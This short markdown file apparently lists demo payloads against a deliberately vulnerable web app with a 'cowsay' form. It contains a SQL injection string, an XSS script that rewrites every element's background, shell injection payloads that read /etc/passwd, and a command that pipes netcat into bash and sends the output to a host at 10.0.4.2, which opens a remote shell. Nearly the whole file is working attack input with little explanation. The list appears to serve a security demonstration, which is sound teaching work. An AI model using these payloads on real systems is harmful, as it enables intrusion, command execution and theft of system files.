# Demo Commands

## SQL Injection

`' OR 1=1--`


## XSS

```html
<script>
    var elements = document.getElementsByTagName('*');
    for (var i = 0; i < elements.length; ++i) {
        elements[i].style.background='url("https://i.imgur.com/HeGEEbu.jpg")';
    }
</script>
```


## Shell Injection

1. `$(whoami)`
2. `$(cat /etc/passwd)`
3. `a"; cat /etc/passwd #`


### Bidirectional Shell

Run locally: `nc -l 9999`
Place in cowsay form field: `a"; nc -l 10000 | bash | nc 10.0.4.2 9999 #`


